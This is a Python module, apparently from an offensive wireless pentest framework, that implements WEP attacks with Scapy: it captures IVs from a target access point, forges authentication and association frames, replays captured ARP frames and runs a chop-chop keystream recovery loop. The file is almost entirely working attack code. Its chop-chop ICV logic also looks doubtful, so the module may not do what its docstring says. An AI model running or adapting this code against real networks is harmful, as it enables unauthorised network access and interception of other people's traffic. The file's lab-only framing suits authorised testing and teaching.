#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""WEP Complete Attack Suite - native Python/Scapy capture and injection.

Cycles through WEP attack vectors (ARP replay, chop-chop, fragmentation,
caffe-latte, Hirte, interactive/P0841) while a Scapy sniffer captures IVs.
Automatically triggers aircrack-ng once sufficient IVs are collected.

Capture and injection are performed natively via Scapy (Phase 0G refactor).
The aircrack-ng binary is retained only for the final key-cracking step
(PTW or FMS/KoreK algorithm).

Requires: aircrack-ng (crack step only), Scapy, monitor-mode interface
with packet-injection support.

Version: 2.0.0
"""


import binascii
import logging
import os
import shutil
import struct
import subprocess
import threading
import time
from typing import List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

SCAPY_AVAILABLE = False
try:
    from scapy.all import (
        LLC,
        SNAP,
        Dot11,
        Dot11AssoReq,
        Dot11Auth,
        Dot11Deauth,
        Dot11Elt,
        Dot11WEP,
        PcapWriter,
        RadioTap,
        sendp,
        sniff,
        wrpcap,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    pass


def _which(binary: str) -> str | None:
    return shutil.which(binary)


def _crc32_ieee(data: bytes) -> int:
    """Compute IEEE 802.3 CRC-32 used as the WEP ICV.

    Args:
        data: Input bytes over which to compute the checksum.

    Returns:
        32-bit unsigned CRC value compatible with WEP ICV expectations.
    """
    return binascii.crc32(data) & 0xFFFFFFFF


def _get_iface_mac(iface: str) -> str:
    """Read the hardware MAC address of a network interface from sysfs.

    Args:
        iface: Interface name (e.g. wlan0mon).

    Returns:
        Colon-separated MAC address string, or a safe local-admin fallback
        if the sysfs path is unavailable (e.g. on non-Linux systems).
    """
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except OSError:
        return "02:11:22:33:44:55"


def _capture_ivs_scapy(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
    iv_list: list[tuple[bytes, bytes]],
    pcap_writer: PcapWriter,
    lock: threading.Lock,
) -> None:
    """Capture WEP IVs via Scapy monitor-mode sniffing.

    Runs as a background daemon thread. Filters WEP-encrypted 802.11 frames
    whose BSSID matches the target, extracts the 3-byte IV, appends the tuple
    (iv, wepdata) to iv_list, and writes the raw packet to pcap_writer so that
    aircrack-ng can read it for the final crack step.

    Replaces airodump-ng IV capture.

    Args:
        iface: Monitor-mode wireless interface name.
        bssid: Target AP BSSID (any capitalisation, colon-separated).
        stop_event: Event that signals the sniffer to terminate.
        iv_list: Shared list accumulating (iv_bytes, wepdata) tuples.
        pcap_writer: Open PcapWriter instance for on-disk persistence.
        lock: Thread lock protecting iv_list and pcap_writer access.
    """
    # REFACTORED: substituido airodump-ng por implementacao nativa Scapy
    bssid_lower = bssid.lower()

    def _process(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11WEP):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None:
            return
        if (dot11.addr3 or "").lower() != bssid_lower:
            return
        wep_layer = pkt[Dot11WEP]
        iv_val = int(getattr(wep_layer, "iv", 0))
        iv = bytes([iv_val & 0xFF, (iv_val >> 8) & 0xFF, (iv_val >> 16) & 0xFF])
        wepdata = bytes(getattr(wep_layer, "wepdata", b"") or b"")
        with lock:
            iv_list.append((iv, wepdata))
            try:
                pcap_writer.write(pkt)
            except Exception:
                pass

    while not stop_event.is_set():
        try:
            sniff(
                iface=iface,
                prn=_process,
                lfilter=lambda p: p.haslayer(Dot11WEP),
                stop_filter=lambda p: stop_event.is_set(),
                timeout=5,
                store=False,
            )
        except Exception as exc:
            logger.debug("IV sniffer error: %s", exc)
            time.sleep(1)


def _fake_auth_loop(
    iface: str,
    bssid: str,
    client_mac: str,
    ssid: str,
    keepalive_s: int,
    stop_event: threading.Event,
) -> None:
    """Send Open System authentication and association to a WEP AP periodically.

    Implements the fake-authentication keepalive as a native Scapy injection
    loop. Sends Dot11Auth (seq 1, open) followed by Dot11AssoReq every
    keepalive_s seconds to maintain association with the AP.

    Replaces aireplay-ng -1 (fake authentication).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID.
        client_mac: Source MAC address to use for the forged client.
        ssid: SSID of the target AP (embedded in association request).
        keepalive_s: Seconds between each authentication cycle.
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -1 por implementacao nativa Scapy
    ssid_bytes = ssid.encode("utf-8") if ssid else b""
    while not stop_event.is_set():
        try:
            auth_pkt = (
                RadioTap()
                / Dot11(
                    type=0, subtype=11,
                    addr1=bssid, addr2=client_mac, addr3=bssid,
                )
                / Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(auth_pkt, iface=iface, verbose=False)
            time.sleep(0.2)
            assoc_pkt = (
                RadioTap()
                / Dot11(
                    type=0, subtype=0,
                    addr1=bssid, addr2=client_mac, addr3=bssid,
                )
                / Dot11AssoReq(cap=0x0431, listen_interval=10)
                / Dot11Elt(ID="SSID", info=ssid_bytes)
                / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
            )
            sendp(assoc_pkt, iface=iface, verbose=False)
            logger.debug("Fake auth sent to %s", bssid)
        except Exception as exc:
            logger.debug("Fake auth injection error: %s", exc)
        stop_event.wait(keepalive_s)


def _arp_replay_loop(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
) -> None:
    """Capture WEP-encrypted ARP frames from the target AP and replay them.

    Each replayed ARP forces the AP to re-encrypt the response with a new IV,
    rapidly inflating the captured IV pool needed for PTW or FMS/KoreK cracking.

    Replaces aireplay-ng -3 (ARP replay attack).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID.
        stop_event: Event that signals the thread to stop.
    """
    # REFACTORED: substituido aireplay-ng -3 por implementacao nativa Scapy
    bssid_lower = bssid.lower()
    captured_frame: object | None = None

    def _grab_arp(pkt):
        nonlocal captured_frame
        if stop_event.is_set() or captured_frame is not None:
            return
        if not pkt.haslayer(Dot11WEP):
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None or (dot11.addr3 or "").lower() != bssid_lower:
            return
        wep = pkt[Dot11WEP]
        wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
        # ARP frames are 28 bytes; encrypted ARP + ICV yields 32-54 bytes
        if 32 <= len(wepdata) <= 54:
            captured_frame = pkt
            logger.info("ARP replay: captured candidate frame (%d bytes)", len(wepdata))

    logger.info("ARP replay: hunting for ARP frames from %s", bssid)
    while not stop_event.is_set():
        if captured_frame is None:
            try:
                sniff(
                    iface=iface,
                    prn=_grab_arp,
                    timeout=5,
                    stop_filter=lambda p: stop_event.is_set() or captured_frame is not None,
                    store=False,
                )
            except Exception as exc:
                logger.debug("ARP capture error: %s", exc)
                time.sleep(1)
        else:
            try:
                sendp(captured_frame, iface=iface, verbose=False)
            except Exception as exc:
                logger.debug("ARP replay send error: %s", exc)
            time.sleep(0.01)


def _chopchop_native(
    iface: str,
    bssid: str,
    stop_event: threading.Event,
    timeout_s: int = 300,
) -> bytes | None:
    """WEP chop-chop keystream recovery via iterative frame truncation.

    Captures a WEP data frame and truncates it one byte at a time. For each
    position, 256 candidate XOR masks are tried. The correct mask is confirmed
    when the AP accepts the truncated-and-repackaged frame without responding
    with a deauthentication (which indicates an invalid ICV).

    ICV recomputation uses IEEE 802.3 CRC-32 (little-endian), matching the
    WEP ICV specification in IEEE 802.11-2020 clause 12.3.2.

    Replaces aireplay-ng -4 (chop-chop attack).

    Args:
        iface: Injection-capable monitor-mode interface.
        bssid: Target AP BSSID.
        stop_event: Event that signals the attack to abort.
        timeout_s: Maximum seconds to wait while hunting for a target frame.

    Returns:
        Recovered keystream as bytes, or None if the attack failed or was aborted.
    """
    # REFACTORED: substituido aireplay-ng -4 por implementacao nativa Scapy
    bssid_lower = bssid.lower()
    target_frame: object | None = None

    def _grab_frame(pkt):
        nonlocal target_frame
        if not pkt.haslayer(Dot11WEP) or target_frame is not None:
            return
        dot11 = pkt.getlayer(Dot11)
        if dot11 is None or (dot11.addr3 or "").lower() != bssid_lower:
            return
        wep = pkt[Dot11WEP]
        wepdata = bytes(getattr(wep, "wepdata", b"") or b"")
        if len(wepdata) > 8:
            target_frame = pkt

    logger.info("ChopChop: waiting for WEP frame from %s (timeout=%ds)", bssid, timeout_s)
    deadline = time.time() + timeout_s
    while target_frame is None and not stop_event.is_set() and time.time() < deadline:
        try:
            sniff(
                iface=iface,
                prn=_grab_frame,
                timeout=5,
                stop_filter=lambda p: target_frame is not None or stop_event.is_set(),
                store=False,
            )
        except Exception as exc:
            logger.debug("ChopChop sniff error: %s", exc)
            time.sleep(1)

    if target_frame is None or stop_event.is_set():
        logger.warning("ChopChop: no suitable frame found or attack aborted")
        return None

    wep_layer = target_frame[Dot11WEP]
    iv_val = int(getattr(wep_layer, "iv", 0))
    payload = bytearray(bytes(getattr(wep_layer, "wepdata", b"") or b""))
    dot11_hdr = target_frame[Dot11]

    recovered_ks = bytearray()
    logger.info("ChopChop: starting byte-by-byte recovery on %d-byte payload", len(payload))

    # Iterate from the last data byte backwards (ICV occupies the final 4 bytes)
    for byte_pos in range(len(payload) - 5, -1, -1):
        if stop_event.is_set():
            break
        found = False

        for guess in range(256):
            if stop_event.is_set():
                break

            trial = bytearray(payload[:byte_pos + 1])
            trial[-1] ^= guess

            # Rebuild ICV for the truncated plaintext prefix
            pt_prefix = bytes(trial[:-4]) if len(trial) >= 4 else bytes(trial)
            new_icv = struct.pack("<I", _crc32_ieee(pt_prefix))
            candidate = pt_prefix + new_icv

            forged = (
                RadioTap()
                / Dot11(
                    type=dot11_hdr.type,
                    subtype=dot11_hdr.subtype,
                    addr1=dot11_hdr.addr1,
                    addr2=dot11_hdr.addr2,
                    addr3=dot11_hdr.addr3,
                    FCfield=dot11_hdr.FCfield,
                )
                / Dot11WEP(iv=iv_val, keyid=0, wepdata=candidate)
            )
            try:
                sendp(forged, iface=iface, verbose=False)
            except Exception:
                continue

            deauth_flag = [False]

            def _watch_deauth(pkt, _bssid=bssid_lower):
                if pkt.haslayer(Dot11Deauth):
                    d = pkt.getlayer(Dot11)
                    if d and (d.addr3 or "").lower() == _bssid:
                        deauth_flag[0] = True

            try:
                sniff(iface=iface, prn=_watch_deauth, timeout=0.4, store=False)
            except Exception:
                pass

            if not deauth_flag[0]:
                recovered_ks.insert(0, guess)
                found = True
                logger.debug("ChopChop: byte[%d] = 0x%02x", byte_pos, guess)
                break

        if not found:
            logger.warning("ChopChop: recovery failed at byte position %d", byte_pos)
            break

    if not recovered_ks:
        return None
    logger.info("ChopChop: recovered %d keystream bytes", len(recovered_ks))
    return bytes(recovered_ks)


